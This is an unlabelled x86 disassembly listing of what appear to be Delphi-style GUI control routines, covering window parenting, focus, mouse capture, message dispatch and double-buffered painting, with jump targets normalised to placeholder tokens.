mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4375b8
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c5b8
sub_4375c8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_4138bc
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_413860
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_437610
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4375c8
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_436e64
call sub_432fc4
inc edi
dec esi
jne r-xdata
sub_4376ac
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4376c8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_413860
call sub_4376c8
inc edi
dec esi
jne r-xdata
sub_437728
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_4032ec
mov ebx eax
mov eax edi
call sub_4376c8
mov eax edi
call sub_437864
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_437768
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_43783e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_434b3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413860
call sub_437768
inc esi
dec ebx
jne r-xdata
sub_437864
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_437768
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_4378a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4376c8
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_437864
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_4067e4
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_434b3c
jmp r-xdata
sub_43792c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437984
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_437973
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43797a
call sub_432398
call sub_41f410
retn
sub_4379a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412404
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_4067cc
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_434b3c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_437a5c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_413860
call sub_4379a4
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_413860
call sub_4379a4
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_437af0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a170
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4067b8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_437a5c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4067cc
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_434b3c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_437b84
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_4340f8
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_434c08
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_437af0
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4067b8
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4334b4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_437a5c
test eax eax
je r-xdata
mov eax ebx
call sub_44a5dc
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_434c08
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_43a170
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43a170
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_434b3c
sub_437ce8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_434d9c
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_434b3c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c698
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41d31c
call sub_41c698
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41d358
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_433510
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_437df0
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_430850
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_434b3c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_437e24
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_437f44
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437f7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437f4b
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413860
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_437f7c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_4138bc
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_413860
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41242c
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_413860
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41c698
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_41242c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41c698
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41242c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4322ac
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_434b3c
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4381ac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4322ac
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_43a170
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_43a170
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_434b3c
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_434b3c
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4322ac
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4381ac
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_413860
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_438300
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_437e24
jmp r-xdata
mov eax ebx
call sub_436ea0
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_438452
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43a170
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_434b3c
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_438300
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43a170
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_438460
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_438480
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4384f4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_438514
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_438534
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_438558
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43857c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4385a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_437df0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4385c4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_428284
mov edi eax
mov eax edi
call sub_428364
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41d358
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43a170
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_428464
jmp r-xdata
sub_43864c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_435470
test bl bl
je r-xdata
mov eax edi
